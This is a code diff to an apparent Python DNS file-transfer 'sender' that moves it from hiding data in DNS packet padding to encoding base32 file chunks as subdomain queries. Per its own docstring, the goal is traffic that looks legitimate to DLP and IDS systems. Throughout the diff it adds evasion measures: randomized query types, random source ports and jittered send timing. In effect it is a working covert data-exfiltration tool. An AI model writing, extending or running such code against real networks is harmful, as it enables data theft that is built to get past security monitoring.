@@ -1,16 +1,33 @@
 #!/usr/bin/env python3
 """DNS File Transfer - Server (Sender)
 
-Sends a file covertly over DNS protocol by embedding file data
-in the Padding layer of DNS packets using Scapy.
+Encodes file data into DNS subdomain queries so traffic
+looks like legitimate DNS lookups to DLP/IDS systems.
+
+Example generated query:
+    JBSWY3DPEB3W64TMMQ.0005.cdn-analytics.com  (type A)
+
+Structure: <base32_chunk>.<seq_number>.<base_domain>
 """
 
+import base64
 import hashlib
+import random
 import sys
+import time
 
-from scapy.all import IP, UDP, DNS, Padding, send
+from scapy.all import IP, UDP, DNS, DNSQR, send
 
-from config import CHUNK_SIZE, DNS_PORT, HASH_ALGORITHM, METADATA_SEPARATOR
+from config import (
+    BASE_DOMAIN,
+    CHUNK_SIZE,
+    DNS_PORT,
+    HASH_ALGORITHM,
+    METADATA_SEPARATOR,
+    QUERY_TYPES,
+    SEND_DELAY,
+    SEND_JITTER,
+)
 
 
 def read_file(filepath):
@@ -31,23 +48,36 @@ def split_into_chunks(data, chunk_size=CHUNK_SIZE):
     return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
 
 
-def build_metadata(chunk_count, file_hash):
-    """Build metadata string: chunk_count||hash."""
-    return f"{chunk_count}{METADATA_SEPARATOR}{file_hash}"
+def encode_chunk(chunk):
+    """Encode a binary chunk to base32 (DNS-safe, case-insensitive).
+
+    Base32 uses only A-Z and 2-7, which are valid DNS label characters.
+    We strip padding '=' since it's not valid in DNS names.
+    """
+    return base64.b32encode(chunk).decode().rstrip("=").lower()
 
 
-def build_base_packet(src_ip, dst_ip):
-    """Create the base DNS packet template."""
-    return IP(src=src_ip, dst=dst_ip) / UDP(dport=DNS_PORT) / DNS() / Padding(load=b"")
+def build_query_name(encoded_data, sequence_num):
+    """Build a DNS query name: <encoded_data>.<seq>.<base_domain>."""
+    return f"{encoded_data}.{sequence_num:04d}.{BASE_DOMAIN}"
+
+
+def random_query_type():
+    """Pick a random DNS query type to vary traffic patterns."""
+    return random.choice(QUERY_TYPES)
+
+
+def add_jitter(base_delay, jitter):
+    """Return delay with random jitter for natural-looking traffic."""
+    return base_delay + random.uniform(-jitter, jitter)
 
 
 def send_file(src_ip, dst_ip, filepath):
-    """Send a file over DNS packets.
+    """Send a file as DNS subdomain queries.
 
-    1. Reads the file and computes its hash
-    2. Splits the file into chunks
-    3. Sends a metadata packet with chunk count and hash
-    4. Sends each chunk as a separate DNS packet
+    Protocol:
+        Packet 0 (seq=0000): metadata → chunk_count||sha256_hash
+        Packet 1..N (seq=0001+): encoded file chunks
     """
     file_data = read_file(filepath)
     file_hash = compute_hash(file_data)
@@ -57,22 +87,42 @@ def send_file(src_ip, dst_ip, filepath):
     print(f"Size: {len(file_data)} bytes")
     print(f"Chunks: {len(chunks)}")
     print(f"Hash ({HASH_ALGORITHM}): {file_hash}")
+    print(f"Domain: {BASE_DOMAIN}")
+    print()
 
-    packet = build_base_packet(src_ip, dst_ip)
+    # Send metadata as first query (seq 0000)
+    metadata = f"{len(chunks)}{METADATA_SEPARATOR}{file_hash}"
+    encoded_meta = encode_chunk(metadata.encode())
+    qname = build_query_name(encoded_meta, 0)
+    qtype = random_query_type()
 
-    # Send metadata packet first
-    metadata = build_metadata(len(chunks), file_hash)
-    packet.getlayer(Padding).load = metadata.encode()
-    print(f"Sending metadata: {metadata}")
-    send(packet, verbose=False)
+    pkt = (
+        IP(src=src_ip, dst=dst_ip)
+        / UDP(sport=random.randint(1024, 65535), dport=DNS_PORT)
+        / DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype))
+    )
+    send(pkt, verbose=False)
+    print(f"[0000] META → {qname} ({qtype})")
 
     # Send file chunks
     for i, chunk in enumerate(chunks):
-        packet.getlayer(Padding).load = chunk
-        send(packet, verbose=False)
-        print(f"\rSending chunk {i + 1}/{len(chunks)}", end="", flush=True)
+        seq = i + 1
+        encoded = encode_chunk(chunk)
+        qname = build_query_name(encoded, seq)
+        qtype = random_query_type()
 
-    print(f"\nTransfer complete. Sent {len(chunks)} chunks.")
+        pkt = (
+            IP(src=src_ip, dst=dst_ip)
+            / UDP(sport=random.randint(1024, 65535), dport=DNS_PORT)
+            / DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype))
+        )
+        send(pkt, verbose=False)
+        print(f"\r[{seq:04d}] Sending chunk {seq}/{len(chunks)}", end="", flush=True)
+
+        delay = add_jitter(SEND_DELAY, SEND_JITTER)
+        time.sleep(delay)
+
+    print(f"\nTransfer complete. Sent {len(chunks)} DNS queries.")
 
 
 def main():
